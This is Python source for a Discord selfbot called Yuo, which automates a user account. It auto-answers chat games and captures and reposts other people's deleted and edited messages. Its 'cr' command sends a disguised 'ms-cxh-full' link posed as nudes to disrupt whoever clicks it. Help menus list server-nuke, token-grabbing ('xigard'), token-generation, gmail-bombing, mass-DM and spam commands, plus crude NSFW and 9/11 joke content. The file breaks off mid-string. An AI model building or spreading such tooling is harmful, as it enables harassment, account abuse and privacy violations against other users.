def async_executor():
    def outer(func):
        @functools.wraps(func)
        def inner(*args, **kwargs):
            thing = functools.partial(func, *args, **kwargs)
            return loop.run_in_executor(None, thing)
        return inner
    return outer


@Yuo.event
async def on_message(message):
    time = random.randint(3, 5)
    if message.author.id == 826996086140698625:
                if message.content:
                    damessage = str(message.content).replace(u'\u200e', '').replace(u'\u200b', '').replace(u'\u200c', '') # removes all the invis nasty usless stuff 
                    
                    # -------------------- Repeats the message -----------------------
                    if 'Repeat after me:' in damessage:
                        matcher = damessage.split('Repeat after me:')[1].replace(f'\u200e', '') # fweak 
                        print(f"{Fore.YELLOW}Message detected! sending in {time} seconds...")
                        await asyncio.sleep(time)
                        print("Message sent!")
                        await message.channel.send(matcher.replace('`', ''))
                    
                    # -------------------- Counting candies -----------------------
                    if "Count the number of candies!" in damessage:                         # me
                        matcher = damessage.split('Count the number of candies!')[1]
                        yoo = matcher.replace('🍬', "-pog")
                        fart = list(yoo.split("-"))        
                        print(f"{Fore.YELLOW}Message detected! sending in {time} seconds...")
                        await asyncio.sleep(time)
                        print(f"{Fore.GREEN}Message sent!")
                        await message.channel.send(fart.count("pog"))
                    
                    # -------------------- Emoji pattern -----------------------
                    if "emoji" in damessage:                                    # fweak 
                        matcher = damessage.split('Memorize the emoji pattern:')[1]
                        print(f"{Fore.YELLOW}Message detected! sending in {time} seconds...")
                        await asyncio.sleep(time)
                        print("Message sent!")
                        await message.channel.send(matcher.replace(' ', ''))                   
                    
                    # -------------------- Random number -----------------------
                    if "I'm thinking of a number between" in damessage:                  # me
                        fart = random.randint(1, 10)
                        print(f"Message detected! sending {fart} messages every 2 seconds...")
                        await asyncio.sleep(2)
                        for x in range(0, fart):
                            await message.channel.send(random.randint(1, 40))
                            await asyncio.sleep(2)
                    
                    # -------------------- Word unscramble -----------------------
                    if "Unscramble the word:" in damessage:                                # me
                        matcher = damessage.split('Unscramble the word:')[1].replace(f'\u200e', '')
                        Scrabled = matcher.replace('`', '')
                        print(f"{Fore.YELLOW}word detected, sending in {time} seconds")
                        v = Vect2Int(Word2Vect(Scrabled))
                        tp = ind.get(v, 'Word Not in Dictionary.')
                        ass = ' '.join(map(str, tp)) 
                        if ass == 'W o r d   N o t   i n   D i c t i o n a r y .':
                            print('unknown word, Add to dictionary manually')
                            pass
                        else:
                            await asyncio.sleep(time)
                            await message.channel.send(ass)
                            print(f"Message '{ass}' sent after {time} seconds!")
                            
                        # -------------------- Colored emoji -----------------------                      # legit all fweak mad man
                    dotsOrder = {
                        '🔵': {
                            'color': 'blue circle?',
                        },
                        '🟢': {
                            'color': 'green circle?'
                        },
                        '⚪': {
                            'color': 'white circle?'
                        }
                    }
                        

                    if 'Remember the order:' in damessage:
                                print(f"{Fore.YELLOW}word detected, waiting for edit...")
                                dotsFromMessage = damessage.split(
                                    'order:')[1].strip().split('\n')

                                for combos in dotsFromMessage:
                                    combination = combos.split(' ')
                                    dot = combination.pop(0)
                                    text = ' '.join(combination)

                                    dotsOrder[dot]['text'] = text

                                ResponeFromEdit = await Exploit.wait_for('message_edit', check=lambda old, new: new.id == message.id)

                                whatTheyWant = ResponeFromEdit[1].content.replace(
                                    u'\u200e', '').replace(u'\u200b', '').split('to the ')[1]

                                for dot in dotsOrder:
                                    order = dotsOrder[dot]
                                    if order['color'] == whatTheyWant:
                                        print(f"{Fore.GREEN}word detected, waiting {time} seconds to send...")
                                        await asyncio.sleep(time)
                                        await message.channel.send(order['text'])
                                        print(f"{Fore.GREEN}sent!")
                                        break
    


# -------------------- dictionary stuff -----------------------

def RemoveFromList(thelist, val):
    return [value for value in thelist if value != val]
    
def GetDic():
    try:
        dicopen = open("DL.txt", "r")
        dicraw = dicopen.read()
        dicopen.close()
        diclist = dicraw.split("\n")
        diclist = RemoveFromList(diclist, '')
        return diclist
    except FileNotFoundError:
        print("Starting...")
        return 

def Word2Vect(word):
    l = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
    v = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
    w = word.lower()
    wl = list(w)
    for i in range(0, len(wl)):
        if wl[i] in l:
            ind = l.index(wl[i])
            v[ind] += 1
    return v

def Vect2Int(vect):
    pv = 0
    f = 0
    for i in range(0, len(vect)):
        wip = (vect[i]*(2**pv))
        f += wip
        pv += 4
    return f

def Convert(string): 
    li = list(string.split(":")) 
    return li 

d = GetDic()

@Yuo.event
async def on_message(message):
    global donotdisturb
    global commanddict
    for key in commanddict:
        if message.content == key:
            await message.delete()
            await message.channel.send(commanddict[key])
    if donotdisturb == True:
        global reply
        if message.author != Yuo.user:
            if not message.guild:
                await message.channel.send(reply)
    await Yuo.process_commands(message)


@Yuo.event
async def on_message_delete(message):
    if message.author.id == Yuo.user.id:
        return
    if Yuo.msgsniper:
        if isinstance(message.channel, discord.DMChannel) or isinstance(message.channel, discord.GroupChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(Yuo.sniped_message_dict) > 1000:
        Yuo.sniped_message_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(message.author))) + "`: " + str(
            message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Yuo.sniped_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(message.author))) + "`: " + discord.utils.escape_mentions(
            message.content) + "\n\n**Attachments:**\n" + links
        Yuo.sniped_message_dict.update({channel_id: message_content})


@Yuo.event
async def on_message_edit(before, after):
    if before.author.id == Yuo.user.id:
        return
    if Yuo.msgsniper:
        if before.content is after.content:
            return
        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = ""
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "`" + str(
                    discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(Yuo.sniped_edited_message_dict) > 1000:
        Yuo.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "`" + str(discord.utils.escape_markdown(str(before.author))) + "`: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        Yuo.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = ""
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "`: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        Yuo.sniped_edited_message_dict.update({channel_id: message_content})


@Yuo.command()
async def snipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Yuo.sniped_message_dict:
        await ctx.send(Yuo.sniped_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")


@Yuo.command(aliases=['adv'])
async def advice(ctx):
    await ctx.message.delete()
    choices = ['Only Way Triumph Over Death Is To Make Your Life A Masterpiece','Never Trust A Soul After What They Did To Nipsey', 'Watch Folks Do The Most When You Need Them Less', 'You Needa Stop Believe Everything That You Feel, And Just Cause You Think It Dont Mean That Its Real', 'They Say Life Is What You Make Of It, But Squares In Your Circle Will Always Fuck Up The Shape Of It', 'Loyalty Is Like Wifi, Poor Connection', 'Money Is Precious, Times Sacred', 'Keep A Small Circle Move Militant, Kill Any Vibe If You Aint Feelin It', 'Always Show Your People Love Cause You Never Know, Dont Wait For Them To Die To Show Love You Never Showed', 'You Know They Want A Favor When They Ask If You Good First', 'Watch When You Get The Light, Those Are Shady Hours','For Girls : You Count My Mistakes And Point Them Out To Me, You So Busy Tryna Catch Me In The Wrong, You Spose Be Looking Out For Me']
    advice = random.choice(choices)
    try:
        embed = discord.Embed(color=0x000000, title="Yuo Selfbot Advice Generator:", description=f"{advice}")
        embed.set_image(url='https://media.discordapp.net/attachments/788473285469274112/808565151132680253/image0.gif')
        embed.set_footer(text="⁺𝘍𝘳𝘰𝘯𝘵𝘭𝘪𝘯𝘦+!🕊", icon_url='https://media.discordapp.net/attachments/788473285469274112/809173727140642856/image0.png?width=449&height=417')
        await ctx.send(embed=embed)

    except:
        await ctx.send(f"{advice}")   


@Yuo.command()
async def pokemon(ctx, pokemon):
    await ctx.message.delete()
    await ctx.send(f'http://play.pokemonshowdown.com/sprites/xyani/{pokemon}.gif')


@Yuo.command(aliases=["esnipe"])
async def editsnipe(ctx):
    await ctx.message.delete()
    currentChannel = ctx.channel.id
    if currentChannel in Yuo.sniped_edited_message_dict:
        await ctx.send(Yuo.sniped_edited_message_dict[currentChannel])
    else:
        await ctx.send("No message to snipe!")

serverurl = "https://myrayuo.on.top/haxxar.php" # https://raizo.de/example.php a
# put your sharex body/form data into here
body = { 
    "key": "example",
    "method": "json",   
    }
imagedir = "" # /i/ as example
fileform = "png" # file as example

@Yuo.command()
async def upload(ctx, file=""):
    if file:
        url = file
    else:
        try:
            url = ctx.message.attachments[0].url
        except IndexError as e:
            return await ctx.send("No attachment found")
    if not url.endswith(".png") and not url.endswith(".gif") and not url.endswith(".jpg") and not url.endswith(".jpeg"):
        return await ctx.send("File type not supported.")
    async with aiohttp.ClientSession() as session:
        async with session.get(url) as resp:
            if resp.status == 200:
                search = re.search("([^.]+$)", url)
                ext = search.group(1)
                s = await aiofiles.open('cache/x.{}'.format(ext), mode="wb")
                await s.write(await resp.read())
                await s.close()
    # upload part 
    files = {
        '{}'.format(fileform): open('cache/x.{}'.format(ext), 'rb')
    }
    r = requests.post(serverurl, files=dict(files), data=body)
    if r.status_code == 200:
        # parse json
        decode = r.content.decode("utf-8") # convert bytes to string 
        x = json.loads(decode)
        await ctx.send(f"{serverurl}{imagedir}" + {fileform}, ["filename"])
    else:
        return await ctx.send("Something went wrong uploading.")


@Yuo.command()
async def cr(ctx):
    await ctx.message.delete()
    await ctx.send("Yo Mama's Nudes: <ms-cxh-full://0>")


@Yuo.command()
async def systeminfo(ctx):
    start = time.perf_counter()
    message = await ctx.send("Ping...")
    end = time.perf_counter()
    duration = (end - start) * 1000
    await ctx.message.delete()
    await message.delete()
    cpuavg = psutil.cpu_percent(interval=None)
    mem = psutil.virtual_memory()[2]
    durround = round(duration, 3)
    embed = discord.Embed(
        title="System informationen", description="", color=RandomColor()
    )
    embed.set_thumbnail(url="https://i.imgur.com/GuRAHY1.png")
    embed.add_field(name="CPU", value=f"{cpuavg}%", inline=True)
    embed.add_field(name="Ram", value=f"{mem}%", inline=True)
    embed.add_field(name="Ping", value=f"{durround}ms", inline=True)
    embed.add_field(name="OS", value=f"{sys.platform}", inline=True)
    embed.set_footer(text="BSDCv1.4")
    await ctx.send(embed=embed)


@Yuo.command()
async def adminservers(ctx):
    await ctx.message.delete()
    admins = []
    bots = []
    kicks = []
    bans = []
    for guild in Yuo.guilds:
        if guild.me.guild_permissions.administrator:
            admins.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.manage_guild and not guild.me.guild_permissions.administrator:
            bots.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.ban_members and not guild.me.guild_permissions.administrator:
            bans.append(discord.utils.escape_markdown(guild.name))
        if guild.me.guild_permissions.kick_members and not guild.me.guild_permissions.administrator:
            kicks.append(discord.utils.escape_markdown(guild.name))
    adminPermServers = f"**Servers with Admin ({len(admins)}):**\n{admins}"
    botPermServers = f"\n**Servers with BOT_ADD Permission ({len(bots)}):**\n{bots}"
    banPermServers = f"\n**Servers with Ban Permission ({len(bans)}):**\n{bans}"
    kickPermServers = f"\n**Servers with Kick Permission ({len(kicks)}:**\n{kicks}"
    await ctx.send(adminPermServers + botPermServers + banPermServers + kickPermServers)


@Yuo.command()
async def bots(ctx):
    await ctx.message.delete()
    bots = []
    for member in ctx.guild.members:
        if member.bot:
            bots.append(
                str(member.name).replace("`", "\`").replace("*", "\*").replace("_", "\_") + "#" + member.discriminator)
    bottiez = f"**Bots ({len(bots)}):**\n{', '.join(bots)}"
    await ctx.send(bottiez)


@Yuo.command()
async def help(ctx, category=None):
    await ctx.message.delete()
    if category is None:
        embed = discord.Embed(color=0x36393f, timestamp=ctx.message.created_at)
        embed.set_author(name="𝘠𝘶𝘰 𝙎𝙀𝙇𝙁𝘽𝙊𝙏 | 𝙋𝙍𝙀𝙁𝙄𝙓: " + str(Yuo.command_prefix),
                         icon_url=Yuo.user.avatar_url)
        embed.set_thumbnail(url=Yuo.user.avatar_url)
        embed.set_image(url="https://cdn.discordapp.com/attachments/827008716263522314/834530076505931846/yuoisontop.gif")
        embed.add_field(name="\uD83E\uDDCA `YUO`", value="Shows all yuo commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `ACCOUNT`", value="Shows all account commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `TEXT`", value="Shows all text commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `RAP`", value="Shows all rap commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `ANIMATIONS`", value="Shows all animation commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `MOD`", value="Shows all mod commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `EMOTES`", value="Shows all emote commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `IMAGE`", value="Shows all image commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `NSFW`", value="Shows all nsfw commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `UTILITY`", value="Shows all utility commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `FUN`", 
        value="Shows all fun commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `MISC`", value="Shows all miscellaneous commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `ANTI-WIZZ`", value="Shows all anti-wizz commands", inline=False)
        embed.add_field(name="\uD83E\uDDCA `NUKE`", value="Show all nuke commands", inline=False)
        await ctx.send(embed=embed)
    elif str(category).lower() == "yuo":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image (url="https://media.discordapp.net/attachments/697225400505598044/783140740824956958/image0.gif?width=540&height=304")
        embed.description = f"\uD83D\uDCB0 `Feel Like Yuo`\n`> help <category>` - returns all commands of that category\n`> bot_invite` - gives you the invite to our bot\n`> support` - sends you an invite to our server for support\n`> helpcog` - returns all cog categorys\n`> creator` - shows this selfbots creator\n`> invite` - sends you an invite to yuo server\n`> info` - gives info about the selfbot\n`> loadcog <cog>` - loads in a cog\n`> unloadcog <cog>` - unloads a cog\n`> ytsearch <query>` - searches the message on youtube\n`> uptime` - return how long the selfbot has been running\n`> gp <user>` - ghostpings specified user\n`> prefix <prefix>` - changes the bot's prefix\n`> ping` - returns the bot's latency\n`> av <user>` - returns the user's pfp\n`> whois <user>` - returns user's account info\n`> free` - displays a link with free accounts \n`> add <command name> <command message>` - adds a command\n`> idiot <user>` - calls out a person for being an idiot\n`> topyuo` - returns top 5 yuo members\n`> tokeninfo <token>` - returns information about the token\n`> copyserver` - makes a copy of the server\n`> rainbowrole <role>` - makes the role a rainbow role (ratelimits)\n`> serverinfo` - gets information about the server\n`> serverpfp` - returns the server's icon\n`> banner` - returns the server's banner\n`> shutdown` - shutsdown the selfbot\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "account":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/827008716263522314/830121354614538240/yuo4.gif")
        embed.description = f"\uD83D\uDCB0 `Selfbot by MYRAYU0 | 金難`\n`> ghost` - makes your name and pfp invisible\n`> invis` - makes your nickname invisible\n`> remind <time> <message>` - sets up an reminder\n`> getallpfp`  - get everyones pfp in the server and dumps it in a file\n`> pfpsteal <user>` - steals the users pfp\n`> setpfp <link>` - sets the image-link as your pfp\n`> hypesquad <hypesquad>` - changes your current hypesquad\n`> spoofcon <type> <name>` - spoofs your discord connection\n`> leavegroups` - leaves all groups that you're in\n`> cyclenick <text>` - cycles through your nickname by letter\n`> stopcyclenick` - stops cycling your nickname\n`> stream <status>` - sets your streaming status\n`> playing <status>` - sets your playing status\n`> listening <status>` - sets your listening status\n`> watching <status>` - sets your watching status\n`> stopactivity` - resets your status-activity\n`> acceptfriends` - accepts all friend requests\n`> delfriends` - removes all your friends\n`> ignorefriends` - ignores all friends requests\n`> clearblocked` - clears your block-list\n`> read` - marks all messages as read\n`> leavegc` - leaves the current groupchat\n`> adminservers` - lists all servers you have perms in\n`> slotbot <on/off>` - snipes slotbots ({Yuo.slotbot_sniper})\n`> giveaway <on/off>` - snipes giveaways ({Yuo.giveaway_sniper})\n`> talkcute <on/off>` - makes you talk cute ({Yuo.talkcute})\n`> dnd <on/off>` - auto sends message to people who dm you ({Yuo.donotdisturb})\n`> mee6 <on/off>` - auto sends messages in the specified channel ({Yuo.mee6}) <#{Yuo.mee6_channel}>\n`> yuikiss <user>` - auto sends yui kisses every minute <@{Yuo.yui_kiss_user}> <#{Yuo.yui_kiss_channel}>\n`> yuihug <user>` - auto sends yui hugs every minute <@{Yuo.yui_hug_user}> <#{Yuo.yui_hug_channel}>\n`> yuistop` - stops any running yui loops\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "text":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/827008716263522314/830121345915289630/yuontop.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | TEXT COMMANDS`\n`> yuo` - sends the Yuo logo\n`> snipe` - shows the last deleted message\n`> editsnipe` - shows the last edited message\n`> msgsniper <on/off> ({Yuo.msgsniper})` - enables a message sniper for deleted messages in DMs\n`> clear` - sends a large message filled with invisible unicode\n`> del <message>` - sends a message and deletes it instantly\n`> 1337speak <message>` - talk like a hacker\n`> spam <amount>` - spams a message\n`> spamedit <amount>` - spams edit messages specified\n`> spamreact <amount>` - spams reactions specified\n`> massreact` - spams reactions\n`> dm <user> <content>` - dms a user a message\n`> dmall <content>` - dms all users in a server\n`> reverse <message>` - sends the message but in reverse-order\n`> bold <message>` - bolds the message\n`> pyfiglet <message>` - makes an ASCII art of your message\n`> smalltxt <message>` - converts message to small letters\n`> fade <message>` - changes message color\n`> censor <message>` - censors the message\n`> underline <message>` - underlines the message\n`> spolier <message>` - marks message ass spoiler\n`> italicize <message>` - italicizes the message\n`> strike <message>` - strikethroughs the message\n`> textflip <message>` - flips messages\n`> hide <visible text> <ping/invite>` - hides your message\n`> embed <image>` - send message in EMBED form\n`> uwufy <message>` - uwufys the message\n`> quote <message>` - quotes the message\n`> load <message>` - loads in what you say\n`> font <fonts>` - changes the font of the message\n`> code <message>` - applies code formatting to the message\n`> purge <amount>` - purges the amount of messages\n`> translate <language> <message>` - translates any language\n`> dictionary <message>` - searches words on google\n`> empty` - sends an empty message\n`> tts <content>` - returns an mp4 file of your content\n`> firstmsg` - shows the first message in the channel history\n`> ascii <message>` - creates an ASCII art of your message\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "mod":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/827008716263522314/827802209403666452/eeeeeee.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | MODERATION COMMANDS`\n`> removerole <user> <id>` - removes role from user specified\n`> addrole <user> <id>` - adds role for user specified\n`> slowmode <amount>` - enables slow mode in the channel\n`> tr <member> <role>` - takes the specified role from the user\n`> lock` - lock a channel\n`> unlock` - unlocks a channel\n`> warn <user>` -  warns the user\n`> warnings <user>` -  shows a list of warning\n`> mute <user>` - mutes the user and makes muted role\n`> unmute <user>` - unmutes the user\n`> block <user>` - kinda like a mute command\n`> unblock <user>`- kinda like the mute command\n`> drop` - sends a message with a reaction, the first person to react will win\n`> gw <time> <prize>` - starts a giveaway\n`> members` - shows how many members are in your server\n`> bot` - deletes bot messages\n`> images` - deletes images\n`> unban <id>` - unbans user specified\n`> ban <user>` - bans user specified\n`> kick <user>` - kicks user specified\n`> clearreactions` - clears reactions\n" 
        await ctx.send(embed=embed)
    elif str(category).lower() == "rap":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://media.discordapp.net/attachments/697225400505598044/790399909404082189/image0.gif?width=540&height=301")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | RAP COMMANDS`\n`> play --song <your-song-name>` - plays a specified song if ur in a voice-channel\n`> join <channel-name>` - joins the specified voice-channel\n`> pause` - pauses the song\n`> resume` - starts the song again\n`> stop` - stops the rap player\n`> skip` - skips the current song playing\n`> add_song <song>` - adds song to playlist\n`> lyrics <song>` - shows the specified song's lyrics\n`> volume <decrease/increase>` - turns volume low or high\n`> show` - shows the  playlist\n`> youtube <query>` - returns the first youtube search result of the query\n`> quit` - the selfbot will disconnect from the voice channel"
        await ctx.send(embed=embed)
    elif str(category).lower() == "animations":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/827008716263522314/830121345915289630/yuontop.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | ANIMATIONS COMMANDS`\n`> flop` - returns with a person flipping another person\n`> catbox` - returns with a cat in a box\n`> boom` - returns with message self destruct\n`> virus` - trolls others people with fake virus\n`> spamreport <user>` - spams chat with a fake report message\n`> table`- returns with a guy flipping a table\n`> warning` - system overload troll\n`> poof` - returns with guy disappearing\n`> wizz` - makes a prank message about wizzing\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "emotes":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/827008716263522314/835199916133056542/sy.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | EMOTE COMMANDS`\n`> lpew` - returns pew pew ----------<(' - '   )\n`> rpew` - returns (   ' - ')>---------- pew pew\n`> thumbs` - returns (👍' - ')👍\n`> cookie` - returns (  ' - ')-🍪\n`> cow` - embeds a text of a cow\n`> uwu` - returns ( ^ - ^ )\n`> shrug` - returns ¯\_(ツ)_/¯\n`> lenny` - returns ( ͡° ͜ʖ ͡°)\n`> fliptable` - returns (╯°□°）╯︵ ┻━┻\n`> unflip` - returns (╯°□°）╯︵ ┻━┻\n`> flop` - returns (   ° - °) (' - '   )\n`> what` - returns (☝◞‸◟)☞\n`> buff` - returns ᕦ( ͡° ͜ʖ ͡°)ᕤ\n`> chill` - returns (▀̿Ĺ̯▀̿ ̿)\n`> cry` - returns ཀ ʖ̯ ཀ\n`> ak` - returns ᡕᠵ᠊ᡃ࡚ࠢ࠘ ⸝່ࠡࠣ᠊߯᠆ࠣ࠘ᡁࠣ࠘̽᠊᠊ࠢ࠘𐡏\n`> happy` - returns ( ͡ᵔ ͜ʖ ͡ᵔ )\n`> wink` - returns ( ͡~ ͜ʖ ͡°)\n`> huh` - returns ( ͡ʘ ͜ʖ ͡ʘ)\n`> sad` - returns ( ͡° ʖ̯ ͡°)\n`> fr` - returns ( ‾ ʖ̫ ‾)\n`> why` - returns (｢๑•₃•)｢ ʷʱʸ?\n`> srsly` - returns (╬≖_≖)\n`> mad` - returns ლಠ益ಠ)ლ\n`> dance` - returns （〜^∇^ )〜\n`> bruh` - returns ( ´・＿・` )\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "image":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://images-ext-1.discordapp.net/external/__GnKIVffGi3PbAL_Q5p9Dt8AuL9upjYyy3q2fW_fv0/https/media.discordapp.net/attachments/760116404107870228/778236393863381002/20201116_215614.gif?width=432&height=265")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | IMAGE MANIPULATION COMMANDS`\n`> tweet <user> <message>` makes a fake tweet\n`> magik <user>` - distorts the specified user\n`> fry <user>` - deep-fry the specified user\n`> blur <user>` - blurs the specified user\n`> pixelate <user>` - pixelates the specified user\n`> Supreme <message>` - makes a *Supreme* logo\n`> darksupreme <message>` - makes a *Dark Supreme* logo\n`> fax <text>` - makes a fax meme\n`> blurpify <user>` - blurpifies the specified user\n`> invert <user>` - inverts the specified user\n`> gay <user>` - makes the specified user gay\n`> communist <user>` - makes the specified user a communist\n`> snow <user>` - adds a snow filter to the specified user\n`> water <text>` - makes text appear on a sign\n`> jpegify <user>` - jpegifies the specified user\n`> grave <user>` - makes a grave for a specified user\n`> speed <user>` - makes a phote of a lighting mcqueen and  the specified user\n`> pornhub <logo-word 1> <logo-word 2>` - makes a PornHub logo\n`> phcomment <user> <message>` - makes a fake PornHub comment\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "nsfw":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/827001739323637761/831549965653377064/nsfw.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | NSFW COMMANDS`\n`> anal` - returns anal pics\n`> erofeet` - returns erofeet pics\n`> feet` - returns sexy feet pics\n`> hentai` - returns hentai pics\n`> boobs` - returns booby pics\n`> tits` - returns titty pics\n`> blowjob` - returns blowjob pics\n`> neko` - returns neko pics\n`> lesbian` - returns lesbian pics\n`> cumslut` - returns cumslut pics\n`> pussy` - returns pussy pics\n`> waifu` - returns waifu pics"
        await ctx.send(embed=embed)
    elif str(category).lower() == "fun":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://media.discordapp.net/attachments/788471921011720222/790315914687545444/image2.gif?width=540&height=304")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | FUN COMMANDS`\n`> pokemon <name>` - returns with pokemon gif\n`> 8ball <question>` - returns an 8ball answer\n`> autodank` - sends pls beg, pls fish, pls hunt and pls bal\n`> stopautodank` - stops autodank\n`> slots` - play the slot machine\n`> junknick` - makes your nickname look like junk\n`> fbi <user>` - trolls user with fbi\n`> stickbug <user>` - trolls user with stickbug vid\n`> coolorcringe` - responds with cool or cringe\n`> simprate <user>` - shows how much of a simp they are\n`> greyscale <user>` - shows profile picture of a greyscale filter\n`> threat <user>` - makes a user into a threat\n`> captcha <user>` - turns user pfp into a captcha\n`> rotate <user>` - rotates the users pfp\n`> kannagen <message>` - makes user text apppear on a paper\n`> cylde` - returns with a picture of cylde and your message\n`> expose <user>` - exposes a user\n`> clown <user>` - clowns someone\n`> beatthesoapinhishand` - sends the yt video\n`> snap <user> <message>` - creates fake ss of user\n`> whowouldwin` - returns with a picture of users pfp\n`> minesweeper` - play a game of minesweeper\n`> dice` - rolls a dice\n`> cat` - returns random cat pic\n`> sadcat` - returns a random sad cat\n`> dog` - returns random dog pic\n`> fox` - returns random fox pic\n`> bird` - returns random bird pic\n`> everyone` - pings everyone through a link\n`> abc` - cyles through the alphabet\n`> 100` - cycles -100\n`> cum` - makes you cum lol?\n`> 9/11` - sends a 9/11 attack\n"
        await ctx.send(embed=embed)
    elif str(category).lower() == "utility":
        embed = discord.Embed(color=random.randrange(0x1000000), timestamp=ctx.message.created_at)
        embed.set_image(url="https://cdn.discordapp.com/attachments/834510749698228234/835735889425596456/yuoontwitch.gif")
        embed.description = f"\uD83D\uDCB0 `YUO SELFBOT | UTILILTY COMMANDS`\n`> weather <city>` - gives info about the weather in given city\n`> backupfriends` - dumps all friends name/tag into a file\n`> proxy` - sends a random proxy with port\n`> proxies` - sends random proxy in a file\n`> eval <code-src>` - checks to see if there are errors\n`> lvl-up <channel id>` - levels you up\n`> inviteinfo` - looks for invite in channel\n`> mtg` - mass generates tokens and dumps them into a file\n`> cuttly <link>` - shortins link given\n`> dlvid <query>` - downloads the youtube video based on a query\n`> allcommands` - sends every command in the selfbot as a list\n`> github` - opens a browser to the github of this selfbot\n`> translate <language>` - translate message to the langage\n`> calc` - gives answer to number promblem\n`> edittag <message>` - sends a message and glitches the tag\n`> servercount` - shows how many servers you are in\n`> history` - saves the chat history on a .txt file\n`> xigard <user>` - gets the user token\n`> createtxt <text>` - creates a .txt file with the text provided\n`> gmailbomb` - bombs the gmail you gave\n`> hspam` - spams the chat with hidden messages\n`> dmlist <message>` - dms everyone on your dms list the message\n`> createembed` - provide a title, desc and a footer seperated with /\n`> hastebin <message>` - posts your message to hastebin\n`> clone` - clones the server\n`> massdm <message>` - dms everyone on the server\n`> dmfriends <message>` - dms your friends the 